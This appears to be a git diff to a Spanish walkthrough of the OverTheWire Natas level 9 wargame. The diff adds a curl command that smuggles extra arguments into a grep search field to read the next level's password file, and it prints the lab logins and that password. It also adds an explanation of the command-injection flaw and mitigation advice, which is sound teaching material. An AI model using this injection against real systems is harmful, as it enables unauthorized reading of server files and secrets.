@@ -766,6 +766,8 @@ Se trata de un fallo de Security through Obscurity (seguridad a través de la os
 
 [Natas Level 8 → Level 9](https://overthewire.org/wargames/natas/natas9.html)
 
+Al visitar el sitio web nos pide iniciar sesión. Iniciamos sesión con las credenciales obtenidas.
+
 ```bash
 curl 'http://natas9.natas.labs.overthewire.org/?needle=&submit=Search' --user natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9
 ```
@@ -799,6 +801,8 @@ Output:
 </html>
 ```
 
+El sitio web muestra un formulario de búsqueda y un link al código fuente que controla el formulario de búsqueda.
+
 [http://natas9.natas.labs.overthewire.org/index-source.html](http://natas9.natas.labs.overthewire.org/index-source.html)
 
 ```php
@@ -815,8 +819,12 @@ if($key != "") {
 ?>
 ```
 
+El código fuente muestra que la variable `key` guarda el input del usuario y lo utiliza para ejecutar el comando `grep`.
+
+La web [GTFOBins](https://gtfobins.org/gtfobins/grep/#file-read) muestra como se puede aprovechar la lectura de archivos a través del comando `grep`. Leemos el archivo que contiene el password del siguiente nivel.
+
 ```bash
-curl -s 'http://natas9.natas.labs.overthewire.org/?needle=%22%22+%2Fetc%2Fnatas_webpass%2Fnatas10&submit=Search' --user natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 | head -n 25
+curl -s -G --data-urlencode 'needle="" /etc/natas_webpass/natas10' -d "submit=Search" 'http://natas9.natas.labs.overthewire.org/' --user natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 | head -n 25
 ```
 
 ```html
@@ -849,4 +857,16 @@ dictionary.txt:Allah
 
 <Callout type="success" title="Password natas10">
 EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv
+</Callout>
+
+<Callout type="warning" title="Vulnerabilidad">
+Se trata de una vulnerabilidad de Command Injection (inyección de comandos del sistema operativo). La aplicación web utiliza la función passthru() de PHP para ejecutar un comando del sistema (grep) concatenando directamente el input del usuario ($key) sin ningún tipo de input sanitization o escaping. Al no limpiar la entrada, un atacante puede insertar metacaracteres del shell (como espacios, punto y coma ;, pipes |, o redirecciones) para modificar la lógica del comando original o inyectar y ejecutar comandos adicionales en el sistema operativo con los privilegios del servidor web.
+- [**CWE-78** Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
+- [**CWE-20** Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
+</Callout>
+
+<Callout type="tip" title="Mitigación">
+- No utilizar funciones que llamen directamente al sistema operativo (como `passthru`, `system`, `exec`, o `shell_exec`). Para buscar palabras en un archivo en PHP, es mucho más seguro utilizar funciones nativas del lenguaje como `file()`, `fgets()`, o expresiones regulares (`preg_match()`).
+- En caso de ser estrictamente necesario interactuar con el sistema operativo, se debe sanitizar el argumento utilizando funciones específicas que escapan los caracteres especiales del shell `escapeshellarg()` o `escapeshellcmd()`.
+- Asegurar que el usuario que ejecuta el servidor web (como `www-data`) tenga permisos estrictamente limitados en el sistema de archivos para mitigar el impacto en caso de una inyección exitosa.
 </Callout>
